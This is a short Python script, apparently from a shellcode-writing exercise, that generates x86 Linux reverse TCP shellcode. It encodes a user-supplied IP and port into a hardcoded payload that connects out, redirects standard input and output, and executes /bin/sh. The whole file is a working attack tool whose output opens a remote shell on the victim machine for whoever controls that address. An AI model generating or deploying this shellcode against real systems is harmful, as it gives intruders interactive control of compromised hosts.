#!/usr/bin/env python3

import sys

def main(ip, port):
    # one liner to convert e.g 127.0.0.1 to \x80\xff\xff\xfe XORed with key 0xff
    # This is to avoid null bytes. However, a null byte ca be introduced if one octet is 0xff
    hex_ip = "".join([hex(int(octet)^255).replace("0x","\\x") for octet in ip.split(".")]) 
    str_port = hex(port).replace('0x','').zfill(4)

    shellcode = r"\x31\xc0\x31\xdb\x31\xd2\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\xb3\x03\x68{ip}\x83\x34\x24\xff\x66\x68{port}\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x3f\x89\xfb\x89\xd1\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xc0\xb0\x0b\xcd\x80"

    hex_port = "\\x{}\\x{}".format(str_port[:2], str_port[2:])

    if "\\x00" in hex_port:
        print("[-] Sorry, null byte found in that port, chose another port.")
        print("[-] Ports between 1-256 will always contain a null byte.")
        print("[-] Port: {}".format(hex_port))
        sys.exit(1)

    if "\\x00" in hex_ip or "\\x0" in hex_ip:
        print("[-] Sorry, a null byte was found in the XORed IP, this is the end for you...")
        print("[-] XORed Value: {}".format(hex_ip))
        sys.exit(1)

    shellcode = shellcode.replace("{port}", hex_port)
    shellcode = shellcode.replace("{ip}", hex_ip)
    print("[+] Reverse TCP shell connecting to {ip}:{port}".format(ip=ip, port=port))
    print("[+] Your Shellcode:")
    print(shellcode)


if __name__ == "__main__":
    if len(sys.argv) < 3:  
        print("Usage: python3 wrapper.py <ip> <port>")
        sys.exit(0)

    if int(sys.argv[2]) < 1024:
        print("[!] Warning: Ports < 1024 must be run as a root")

    if len(sys.argv) == 3:
        if (int(sys.argv[2]) > 65535):
            print("[-] Port too large")
            sys.exit(1)
        main(sys.argv[1], int(sys.argv[2]))

